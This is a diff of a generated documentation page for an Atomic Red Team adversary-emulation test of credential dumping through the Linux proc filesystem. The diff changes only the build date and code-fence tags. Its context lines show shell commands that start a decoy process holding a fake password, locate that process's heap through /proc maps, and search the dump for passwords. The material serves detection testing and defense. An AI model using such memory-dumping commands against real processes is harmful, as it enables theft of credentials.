@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.007"
 attack_technique_name: "OS Credential Dumping: Proc Filesystem"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "7e91138a-8e74-456d-a007-973d67a0bb80"
@@ -64,14 +64,14 @@ Script to launch target process must exist
 
 ### Prerequisite Check
 
-```text
+```untitled
 test -f #{script_path}
 grep "#{pid_term}" #{script_path}
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 echo '#!/bin/sh' > #{script_path}
 echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
 ```
@@ -83,7 +83,7 @@ echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_pa
 
 ### Command
 
-```sh
+```bash
 sh #{script_path}
 PID=$(pgrep -n -f "#{pid_term}")
 HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
@@ -96,7 +96,7 @@ grep -i "PASS" "#{output_file}"
 
 ### Cleanup
 
-```sh
+```bash
 rm -f "#{output_file}"
 ```
 
